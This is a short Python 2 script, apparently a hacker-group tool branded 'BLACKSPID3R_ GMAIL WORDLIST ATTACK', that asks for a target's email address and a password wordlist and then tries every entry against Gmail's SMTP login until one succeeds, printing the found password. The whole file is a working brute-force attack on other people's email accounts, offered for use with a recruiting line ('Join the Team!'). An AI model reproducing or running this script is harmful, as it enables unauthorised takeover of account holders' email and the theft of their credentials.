import smtplib
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
print ""
print ""
print "                         ************************************"
print "                         *BLACKSPID3R_ GMAIL WORDLIST ATTACK*"
print "                         ************************************"
print "                              Join the Team! @blackspid3r_"
print ""
print ""
print "Put your Password list in Script folder! "
user = raw_input("Enter target's e-mail adress: ")
passwfile = raw_input("Enter Wordlist name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
		smtpserver.login(user,password)
		print "[+] Password Found: %s" % password
	        break;
	except smtplib.SMTPAuthenticationError:
		print "[!] Password Incorrect: %s" % password













